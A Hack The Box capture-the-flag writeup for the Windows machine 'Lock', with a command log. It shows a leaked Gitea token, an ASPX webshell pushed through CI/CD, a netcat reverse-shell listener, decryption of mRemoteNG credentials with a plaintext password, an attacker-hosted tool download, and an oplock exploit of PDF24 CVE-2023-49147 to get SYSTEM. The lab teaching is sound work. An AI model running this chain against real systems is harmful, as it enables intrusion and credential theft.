---
layout: writeup
name: "Lock"
platform: "HackTheBox"
category: "retired"
difficulty: "Medium"
permalink: /writeups/retired/lock/
os: "Hack The Box"
date: 2026-02-25
pwned: true
---
# 🔒 Lock — Writeup (inksec.io)

**Platform:** Hack The Box
**Domain:** `lock.htb`
**IP:** 10.129.139.121
**Difficulty:** Medium
**OS:** Windows
**Status:** Retired
**Writeup Path:** /CTF-Writeups/HTB/Lock/README.md
**Proof Image:** [https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/lock.png](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/lock.png)

> Tip: add host mapping first → `echo "10.129.139.121 lock.htb" | sudo tee -a /etc/hosts`

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Initial Access — Gitea CI/CD abuse](#initial-access--gitea-cicd-abuse)
3. [Post‑exploitation — Creds (mRemoteNG)](#post‑exploitation--creds-mremoteng)
4. [Privilege Escalation — PDF24 Creator (CVE‑2023‑49147)](#privilege-escalation--pdf24-creator-cve‑2023‑49147)
5. [Proofs](#proofs)
6. [Post‑Exploitation & Cleanup](#post‑exploitation--cleanup)
7. [Lessons Learned](#lessons-learned)
8. [References](#references)
9. [Command Log (raw)](#command-log-raw)

---

## Overview

Gitea on **3000/tcp** exposed a Personal Access Token (PAT) in commit history. Using that token we enumerated repos via the API and cloned the **website** repo. Pushing an **ASPX webshell** triggered CI/CD auto‑deploy → RCE as `ellen.freeman`. Looting **mRemoteNG** `config.xml` yielded RDP creds for `Gale.Dekarios`. From that session, abusing **PDF24 Creator** (CVE‑2023‑49147) with an **oplock** on its log produced a hanging **SYSTEM** console.

**TL;DR chain:** PAT leak in git → repo clone via API header → ASPX webshell push → RCE (ellen) → mRemoteNG creds → RDP (Gale) → PDF24 CVE‑2023‑49147 (oplock) → **SYSTEM**.

---

## Enumeration

### Rustscan / Nmap

```bash
export target=10.129.139.121
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN scans/nmap_full
# 80/tcp  http   (ASP.NET headers observed)
# 3000/tcp http  Gitea
```

### Web quick checks

```bash
curl -I http://lock.htb/
# note X-Powered-By / ASP.NET hints
```

### Gitea — find the leaked PAT quickly

```bash
git clone http://lock.htb:3000/some/public/repo.git tmp && cd tmp
# search for token symbol across all history
git log --all -p -S GITEA_ACCESS_TOKEN | sed -n '1,120p'
# (mask token in notes: 43ce39...362f)  ➜ rotate if exposed
```

### Gitea API enumeration (safer auth header)

```bash
export GITEA_PAT=43ce39bb0bd6bc48...7362f
# list repos without embedding token in the URL
git -c http.extraheader="Authorization: token $GITEA_PAT" \
    ls-remote http://lock.htb:3000/ellen.freeman/website.git
```

Clone with header:

```bash
git -c http.extraheader="Authorization: token $GITEA_PAT" \
    clone http://lock.htb:3000/ellen.freeman/website.git
```

---

## Initial Access — Gitea CI/CD abuse

CI/CD redeploys on push. Add a webshell and push a change:

```bash
cp ~/kits/webshells/aspx/webshell.aspx website/webshell.aspx
cd website
git add webshell.aspx && git commit -m "deploy webshell" && git push
```

Trigger shell:

```
http://lock.htb/webshell.aspx
```

Listener:

```bash
rlwrap nc -lvnp 4444
```

You should land as `ellen.freeman`.

---

## Post‑exploitation — Creds (mRemoteNG)

Locate saved mRemoteNG config and decrypt locally:

```powershell
# on target (PowerShell)
dir "$env:USERPROFILE\AppData\Roaming\mRemoteNG" -Filter *conf*.xml -Recurse
# copy the xml to attacker, then on attacker:
```

```bash
git clone https://github.com/kmahyyg/mremoteng-decrypt.git
python3 mremoteng-decrypt/mremoteng_decrypt.py -rf config.xml
# ➜ recovered: user Gale.Dekarios / pass ty8wnW9qCKDosXo6
```

RDP in:

```bash
xfreerdp3 /u:"Gale.Dekarios" /p:'ty8wnW9qCKDosXo6' /v:$target \
  /size:1280x720 /tls:seclevel:0 /cert:ignore
```

---

## Privilege Escalation — PDF24 Creator (CVE‑2023‑49147)

Check version:

```powershell
(Get-Item 'C:\Program Files\PDF24\pdf24-PrinterInstall.exe').VersionInfo.FileVersion
# vulnerable ≤ 11.15.1
```

Hold an **oplock** (read lock) on the log and run repair:

```powershell
# (host SetOpLock.exe yourself to avoid outbound fetches)
# attacker: python3 -m http.server 8000  (serve the exe)
# target PS:
iwr http://10.10.14.12:8000/SetOpLock.exe -OutFile $env:TEMP\SetOpLock.exe
& $env:TEMP\SetOpLock.exe 'C:\Program Files\PDF24\faxPrnInst.log' r
# Now open PDF24 Creator and run Repair (invokes msiexec /fa)
```

A **SYSTEM** cmd window should hang due to the oplock. Use it to spawn a proper SYSTEM shell.

Prove:

```powershell
whoami  # nt authority\system
Get-Content C:\Users\Administrator\Desktop\root.txt
```

---

## Proofs

```text
user.txt: HTB{3e2d99bad2f8025d1e9037829cREDACTED}
root.txt: HTB{a5397a3299e8f19f20dbb30e97REDACTED}
```

---

## Post‑Exploitation & Cleanup

* Remove webshell and redeploy a clean build.
* Delete dropped tooling (`SetOpLock.exe`).
* Clear recent docs/RDP artifacts as rules allow.
* **Rotate/expire** any exposed tokens (PAT).

---

## Lessons Learned

* CI/CD trust boundaries: never deploy unreviewed commits to prod.
* Secrets in git history are **forever** unless rotated—scan histories for tokens.
* Config files (mRemoteNG) often hold retrievable creds.
* PDF24 Creator < 11.15.2 is vulnerable; update closes this path.
* Oplocks are a potent but niche Windows primitive for privesc.

---

## References

* CVE‑2023‑49147 (PDF24 Creator) — vendor changelog notes fix in **11.15.2**.
* Google Project Zero symbolic‑link testing tools — `SetOpLock.exe`.
* mRemoteNG credential decryption — `mremoteng-decrypt` utility.
* HTB community write‑ups for "Lock" (cross‑check techniques).

---

## Command Log (raw)

```bash
# hosts mapping
printf "10.129.139.121 lock.htb\n" | sudo tee -a /etc/hosts

# scan
export target=10.129.139.121
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN scans/nmap_full
curl -I http://lock.htb/

# gitea history & API
git log --all -p -S GITEA_ACCESS_TOKEN
export GITEA_PAT=43ce39bb0bd6bc48...7362f
git -c http.extraheader="Authorization: token $GITEA_PAT" \
    clone http://lock.htb:3000/ellen.freeman/website.git

# webshell deploy
cp webshell.aspx website/webshell.aspx && cd website \
  && git add webshell.aspx && git commit -m "deploy webshell" && git push
rlwrap nc -lvnp 4444

# creds (mRemoteNG)
python3 mremoteng-decrypt.py -rf config.xml
xfreerdp3 /u:"Gale.Dekarios" /p:'ty8wnW9qCKDosXo6' /v:$target /size:1280x720 /tls:seclevel:0 /cert:ignore

# privesc (oplock)
iwr http://10.10.14.12:8000/SetOpLock.exe -OutFile $env:TEMP/SetOpLock.exe
$env:TEMP/SetOpLock.exe 'C:\\Program Files\\PDF24\\faxPrnInst.log' r
whoami && type C:\\Users\\Administrator\\Desktop\\root.txt
```
